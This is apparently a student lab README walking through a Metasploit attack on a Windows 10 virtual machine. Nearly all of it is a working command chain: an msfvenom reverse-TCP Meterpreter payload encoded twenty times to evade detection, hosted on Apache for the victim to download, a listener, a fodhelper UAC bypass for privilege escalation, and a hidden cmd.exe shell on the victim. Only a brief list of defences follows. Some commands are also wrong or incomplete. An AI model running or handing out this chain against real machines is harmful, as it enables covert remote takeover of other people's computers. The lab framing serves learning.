# Metasploit Framework 

##  Project Overview
This project demonstrates the use of the Metasploit Framework in a controlled lab environment. It follows a structured **penetration testing methodology** to help understand how attacks are simulated and how systems can be defended.

---

##  Project Objectives
- Understand Metasploit Framework fundamentals
- Generate payloads using `msfvenom`
- Configure and run a handler (listener)
- Understand reverse TCP connections
- Secure systems

---

## Tools & Technologies
- **Attacker OS:** Kali Linux
- **Framework:** Metasploit Framework
- **Payload Tool:** msfvenom
- **Target OS:** Windows 10 Virtual Machine 
- **Virtualization:** VirtualBox / VMware
- **Network:** Host-only / Internal network

---

##  Step-by-Step Methodology

### 🔹 1: Generate payload
```
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.164.22.238 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 20 -o test.exe
```

- `windows/meterpreter/reverse_tcp` → Payload type
- `LHOST` → Kali Linux IP address
- `LPORT` → Listening port
- `-f exe` → Output format (Windows executable)
- `-e x86/shikata_ga_nai` → Encoder
- `-i 20` → Numbes of time the payload would be encoded
- `-o test.exe` → Output file name

  
### 🔹 2: Make the payload executable
- Move the payload to executable directory
```
sudo mv test.exe /var/www/html
```
- Go to the executable directory
```
cd /var/www/html
```
- List the files in the directory
```
ls
```
- change the mode of the payload to make it executable
```
sudo chmod +x test.exe
```
- list the files to confirm the change (the file should change into a green color)
```
ls
```

### 🔹 3: Deploy payload on a server
For the sake of this project, I used the  apache server
- start the apache server
```
sudo start apache2
```
- confirm the server is running
```
sudo status apache2
```

### 🔹 4: Start Metasploit
```
sudo msfconsole
```

### 🔹 5: Set up listener
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <kali_ip>
set LPORT 
run
```

### 🔹 6: Execute payload
- on the windows OS, to the the browser and enter
  ```
  <kali_ip>/payload file
  10.164.22.238/text.exe
  ```
- The payload would execute and you can see you gained access from your metasploit.

### 🔹 7: Gain privileged access to the hacked windows
from meterpreter, run
```
bg
```
```
use exploit/windows/local/bypassuac_fodhelper
```
```
set SESSION 1
```
```
show options
```
```
exploit
```

### 🔹8: Gain access to the windows cmd from your kali machine
To gain access to the cmd run `execute -f cmd.exe -i` on kali. This command will give you access to the cmd on the kali and also open the cms on windows.
you can also gain access to the cmd without the cmd panel opening on the victims machine. run `execute -f cmd.exe -H`

## Security Measures
- Regularly update operating systems and applications
- Apply security patches promptly
- Block unnecessary inbound and outbound ports
- Restrict traffic to required services only
- Enable real-time antivirus protection
- Use Endpoint Detection and Response (EDR) solutions
